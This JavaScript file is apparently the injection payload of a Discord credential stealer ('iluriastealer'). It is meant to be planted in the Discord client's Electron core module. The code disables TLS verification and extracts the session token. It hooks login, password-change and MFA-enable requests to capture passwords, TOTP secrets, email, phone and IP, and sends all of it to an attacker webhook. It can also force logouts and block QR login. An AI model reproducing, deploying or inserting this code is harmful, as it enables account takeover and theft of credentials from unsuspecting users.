process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0
const fs = require("fs");
const electron = require("electron");
const https = require("https");
const queryString = require("querystring");

var computerName = process.env.COMPUTERNAME;
var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`;
var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`;

const dataNow = new Date().toISOString();

const webhook = '%WEBHOOK_STEALER%';

let contents2FA = [];

var config = {
  "logout": "%LOGOUT%",
  "logout-notify": "true",
  "init-notify": "true",
  "embed-color": 3553599,
  "disable_qrcode": "%DISABLE_QRCODE%",
  Filter: {
        urls: [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"
        ]
    },
    onCompleted: {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            "https://api.stripe.com/v*/tokens",
            "https://discord.com/api/v*/auth/mfa/totp",
            "https://discordapp.com/api/v*/auth/mfa/totp",
            "https://*.discord.com/api/v*/auth/mfa/totp",
            "https://discord.com/api/v*/users/@me/mfa/totp/enable"
        ]
    },
};

async function execScript(str) {
    var window = electron.BrowserWindow.getAllWindows()[0]
    var script = await window.webContents.executeJavaScript(str, true)
    return script || null

};

const getIP = async () => {
    var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`)
    return json.ip
};

const getURL = async (url, token) => {
    var c = await execScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "${url}", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    JSON.parse(xmlHttp.responseText);`)
    return c
};

const GetBadges = (e) => {
    var n = "";
    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:1041639667226914826> "), 4 == (4 & e) && (n += "<:hypesquadevent:1082679435452481738> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:666_hackingmyshit:1107319657603551253> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:devcertif:1041639665498861578> "), "" == n && (n = ":x:"), n
};

const GetA2F = (bouki) => {
    switch (bouki) {
        case true:
            return "`MFA Enabled`"
        case false:
            return "`No MFA found.`"
        default:
            return "`WTF DONT HAVES MFA OR HAVES?????`"
    }
};


const parseBilling = billings => {
    var Billings = ""
    try{
    if(!billings) return Billings = `\`No payment methods found.\``;
    billings.forEach(res => {
        if (res.invalid) return
        switch (res.type) {
            case 1:
                Billings += "<:rustler:987692721613459517>"
                break
            case 2:
                Billings += "<:946246524504002610:962747802830655498>"
        }
    })
    if (!Billings) Billings = `\`No payment methods found.\``
    return Billings
}catch(err){
    return `\`No payment methods found.\``
}
};

const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b));

const GetNitro = r => {
    switch (r.premium_type) {
        default:
            return ":x:"
        case 1:
            return "<:946246402105819216:962747802797113365>"
        case 2:
            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
            var now = new Date(Date.now())
            var arr = ["<:lvl1:1223097977258774569>", "<:lvl2:1223097987740471306>", "<:lvl3:1223097997634834625>", "<:lvl4:1223098007780589580>", "<:lvl5:1223098018916732939>", "<:lvl6:1223098032954937435>", "<:lvl7:1223098045030207689>", "<:lvl8:1223098057546141716>", "<:lvl9:1223098068417773611>"]
            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
            var b = [2, 3, 6, 9, 12, 15, 18, 24]
            var r = []
            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
            var i = 0
            for (var p of r) p > 0 ? "" : i++
            return "<:946246402105819216:962747802797113365> " + arr[i]
    }
};


async function sendWebhook(webhookUrl, webhookData) {

  const jsonData = JSON.stringify(webhookData);

  const urlParts = new URL(webhookUrl);
  const requestOptions = {
    hostname: urlParts.hostname,
    path: urlParts.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': jsonData.length,
    },
  };

  const request = https.request(requestOptions, (response) => {
    let responseData = '';

    response.on('data', (chunk) => {
      responseData += chunk;
    });

    response.on('end', () => {
      console.log('Webhook response:', responseData);
    });
  });

  request.on('error', (error) => {
    console.error('Error sending webhook:', error);
  });

  request.write(jsonData);

  request.end();
};

const path = (function () {
    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/")
    appPath.pop()
    appPath = appPath.join("/")
    var appName = electron.app.getName()
    return {
        appPath,
        appName
    }
}());

async function initOne() {
  var ip = await getIP()
  var token = await execScript(tokenScript)

  var user = await getURL("https://discord.com/api/v8/users/@me", token)

  var avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`

  if (config['init-notify'] !== "true") {
    return true;
  }

  if (!fs.existsSync(__dirname + "/iluria")) {
    fs.mkdirSync(__dirname + "/iluria");
  }else {
    return true;
  }
  var { appPath, appName } = path;
  var client_discord = appName;

  const embed = {
    color: 0x590000,
    fields: [
      {
        name: "<:lnk:1223121782970519583> Token",
        value: `\`\`\`${token}\`\`\``,
        inline: false
      },
      {
        name: "<:japan:1223077879990980739> Injection Path:",
        value: "`"+__dirname+"`",
        inline: true
      },
      {
        name: "<:skull:1223079288786653254> Client:",
        value: "`"+appName+"`",
        inline: true
      },
      {
        name: "<:skull:1223079288786653254> Computer Name:",
        value: "`"+computerName+"`",
        inline: true
      },
      {
        name: "<:butterfly:1223077684075036683> IP:",
        value: "`"+ip+"`",
        inline: true
      },
    ],
    thumbnail: {
        url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
    },
    author: {
        name: user.username+" | First Injection 👀",
        icon_url: "https://m.media-amazon.com/images/I/61TUaBFzZHL._AC_UY1000_.jpg",
    },
    footer: {
        text: "Nikki will de$troy everyone 🏴‍☠"
      },
    timestamp: dataNow,
  };

  const webhookData = {
    embeds: [embed],
  };

  sendWebhook(webhook, webhookData);
  await execScript(logOutScript);
};

initOne();


electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, (details, callback) => {
  if (config["disable_qrcode"] == true) {
    if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  }
});

electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
  if (!["POST", "PATCH"].includes(request.method)) return
  if (request.statusCode !== 200) return

  try {
      var data = JSON.parse(request.uploadData[0].bytes)
  } catch (err) {
      var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
  }

  var token = await execScript(tokenScript)
  var user = await getURL("https://discord.com/api/v8/users/@me", token)
  var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

  if (!user.avatar) var userAvatar = "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a"
  if (!user.banner) var userBanner = ""

  userAvatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`

  var {
      appName
  } = path
  var client_discord = appName


  switch(true) {

    case request.url.endsWith("login"):
      var password = data.password

      contents2FA.push({passwd: password});

      if(token == null) {
        return true;
      }

      const embedLogin = {
        color: 3553599,
        fields: [
            {
              name: "<:lnk:1223121782970519583> Token",
              value: `\`\`\`${token}\`\`\``,
                inline: false
              },
              {
                name: "<:verified:1223121902638202991> Badges",
                value: GetBadges(user.flags),
                inline: false
              },
              {
                name: "<:boost:1223121770798649355> Boost",
                value: GetNitro(Nitro),
                inline: false
              },
              {
                name: "<:file:1223121777471782963> Telephone Number",
                value: "`"+user.phone+"`",
                inline: false
              },
              {
                name: "<:note:1223121898234449971> Email Address",
                value: "`"+user.email+"`",
                inline: false
              },
              {
                name: "<:more:1223121788712783914> Password Account",
                value: "`"+passwdddd+"`",
                inline: false
              },
              {
                name: "<:shield3:1223121800448184393> Multi-Factor Authentication",
                value: GetA2F(user.mfa_enabled),
                inline: false
              },
        ],
        author: {
            name: `${user.username}#0 (${user.id})`,
            icon_url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`,
        },
        footer: {
          text: "t.me/iluriastealer"
        },
        timestamp: dataNow,
      }

      const dataLogin = {
        embeds: [embedLogin],
      }

      await sendWebhook(webhook, dataLogin);
      break

    case request.url.endsWith("totp"):

      const passwdddd = contents2FA[0].passwd;

      const embedLogin3 = {
        color: 3553599,
        fields: [
            {
              name: "<:lnk:1223121782970519583> Token",
              value: `\`\`\`${token}\`\`\``,
                inline: false
              },
              {
                name: "<:verified:1223121902638202991> Badges",
                value: GetBadges(user.flags),
                inline: false
              },
              {
                name: "<:boost:1223121770798649355> Boost",
                value: GetNitro(Nitro),
                inline: false
              },
              {
                name: "<:file:1223121777471782963> Telephone Number",
                value: "`"+user.phone+"`",
                inline: false
              },
              {
                name: "<:note:1223121898234449971> Email Address",
                value: "`"+user.email+"`",
                inline: false
              },
              {
                name: "<:more:1223121788712783914> Password Account",
                value: "`"+passwdddd+"`",
                inline: false
              },
              {
                name: "<:shield3:1223121800448184393> Multi-Factor Authentication",
                value: GetA2F(user.mfa_enabled),
                inline: false
              },
        ],
        author: {
            name: `${user.username}#0 (${user.id})`,
            icon_url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`,
        },
        footer: {
          text: "t.me/iluriastealer"
        },
        timestamp: dataNow,
      }

      contents2FA.splice(0, contents2FA.length);

      const dataLogin3 = {
        embeds: [embedLogin3],
      }

      await sendWebhook(webhook, dataLogin3);
      break
    case request.url.endsWith("@me"):
      var old_passwd = data.password;
      var new_passwd = data.new_password;

      if(!new_passwd || !old_passwd) {
        return true
      }

      const embedNewPasswd = {
        color: 3553599,
        fields: [
          {
            name: "<:lnk:1223121782970519583> Token",
            value: `\`\`\`${token}\`\`\``,
              inline: false
            },
            {
              name: "<:verified:1223121902638202991> Badges",
              value: GetBadges(user.flags),
              inline: false
            },
            {
              name: "<:boost:1223121770798649355> Boost",
              value: GetNitro(Nitro),
              inline: false
            },
            {
              name: "<:file:1223121777471782963> Telephone Number",
              value: "`"+user.phone+"`",
              inline: false
            },
            {
              name: "<:note:1223121898234449971> Email Address",
              value: "`"+user.email+"`",
              inline: false
            },
            {
              name: "<:user:1223121805011587173> Old Password:",
              value: "`"+old_passwd+"`",
              inline: false
            },
            {
              name: "<:more:1223121788712783914> New Password:",
              value: "`"+new_passwd+"`",
              inline: false
            },
            {
              name: "<:verified2:1223121810023911454> Multi-Factor Authentication",
              value: GetA2F(user.mfa_enabled),
              inline: false
            },
          ],
          author: {
            name: `Password has been changed - ${user.username}#0 (${user.id})`,
            icon_url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`,
        },
        footer: {
          text: "t.me/iluriastealer"
        },
        timestamp: dataNow,
      }

      const webhookData2 = {
        embeds: [embedNewPasswd],
      }

      await sendWebhook(webhook, webhookData2);
      break

    case request.url.endsWith("enable"):
      var secret = data.secret;
      var password = data.password;
      var new_token = await execScript(tokenScript);

      const embedMFAENABLED = {
        color: 3553599,
        fields: [
          {
            name: "<:lnk:1223121782970519583> Token",
            value: `\`\`\`${token}\`\`\``,
            inline: false
          },
          {
            name: "<:note:1223121898234449971> Email Address",
            value: "`"+user.email+"`",
            inline: false
          },
          {
            name: "<:more:1223121788712783914> Password Account",
            value: "`"+passwdddd+"`",
            inline: false
          },
          {
            name: "<a:fire:1223077717738655744> Secret Key MFA",
            value: "`"+secret+"`",
            inline: false
          },
        ],
        author: {
          name: `Multi-Factor Authentication has been enabled - ${user.username}#0 (${user.id})`,
          icon_url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`,
        },
        footer: {
          text: "t.me/iluriastealer"
        },
        timestamp: dataNow,
      }

      const dataToWebhook = {
        embeds: [embedMFAENABLED],
      }

      await sendWebhook(webhook, dataToWebhook);
      break
  }
});

module.exports = require("./core.asar");
